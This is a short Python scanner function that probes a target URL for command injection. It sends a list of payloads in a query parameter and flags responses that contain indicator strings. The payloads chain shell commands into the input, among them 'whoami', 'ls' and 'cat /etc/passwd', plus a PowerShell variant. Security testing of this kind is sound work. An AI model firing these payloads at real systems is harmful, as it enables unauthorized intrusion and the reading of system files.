import requests
import logging

# ✅ Common Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    ";& ls",                 # UNIX-based command execution
    "| whoami",              # Get current user
    "& echo vulnerable",     # Echo to detect successful execution
    "; cat /etc/passwd",     # Attempt to read sensitive files
    "| powershell.exe -c whoami",  # Windows PowerShell execution
]

def check_command_injection(target_url):
    """
    Tests a given URL for command injection vulnerabilities.
    """
    results = []

    for payload in COMMAND_INJECTION_PAYLOADS:
        try:
            # ✅ Inject payload into a test parameter
            test_url = f"{target_url}?input={payload}"
            response = requests.get(test_url, timeout=5)

            # ✅ Check if command execution output appears in the response
            if any(indicator in response.text.lower() for indicator in ["root", "admin", "vulnerable", "etc/passwd"]):
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})

        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
    
    return results